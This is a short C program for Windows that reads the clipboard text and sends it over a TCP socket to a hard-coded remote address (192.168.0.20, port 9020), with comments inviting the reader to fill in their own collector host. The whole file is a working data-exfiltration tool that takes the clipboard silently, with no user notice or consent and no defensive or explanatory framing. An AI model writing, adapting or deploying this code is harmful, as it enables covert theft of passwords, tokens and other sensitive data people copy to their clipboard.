#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// Socket variables
SOCKET sock;
struct sockaddr_in server;

// Function to initialize the Winsock library and establish a socket connection
int InitializeSocket(const char *serverIP, int port)
{
    WSADATA wsaData;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("Failed to initialize Winsock.\n");
        return 0;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("Failed to create socket.\n");
        WSACleanup();
        return 0;
    }

    // Set server details
    server.sin_addr.s_addr = inet_addr(serverIP);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // Connect to remote server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        printf("Failed to connect to the remote server.\n");
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    return 1;
}

// Function to send data over the socket connection
int SendData(const char *data)
{
    if (send(sock, data, strlen(data), 0) < 0)
    {
        printf("Failed to send data.\n");
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    return 1;
}

// Function to retrieve clipboard content
char *GetClipboardText()
{
    if (!OpenClipboard(NULL))
    {
        printf("Failed to open the clipboard.\n");
        return NULL;
    }

    HANDLE handle = GetClipboardData(CF_TEXT);
    if (handle == NULL)
    {
        printf("Failed to get clipboard data.\n");
        CloseClipboard();
        return NULL;
    }

    char *text = (char *)GlobalLock(handle);
    if (text == NULL)
    {
        printf("Failed to lock clipboard data.\n");
        CloseClipboard();
        return NULL;
    }

    char *clipboardText = strdup(text); // Duplicate the clipboard text
    GlobalUnlock(handle);
    CloseClipboard();

    return clipboardText;
}

int main()
{
    // Initialize the socket connection to the remote machine
    const char *serverIP = "192.168.0.20"; // Replace with the actual IP address of the remote machine
    int port = 9020;                       // Replace with the actual port number of the remote machine

    if (!InitializeSocket(serverIP, port))
    {
        return 1;
    }

    // Get the clipboard content
    char *clipboardText = GetClipboardText();
    if (clipboardText == NULL)
    {
        return 1;
    }

    // Send the clipboard content to the server
    if (!SendData(clipboardText))
    {
        free(clipboardText);
        return 1;
    }

    free(clipboardText);

    // Cleanup
    closesocket(sock);
    WSACleanup();

    return 0;
}
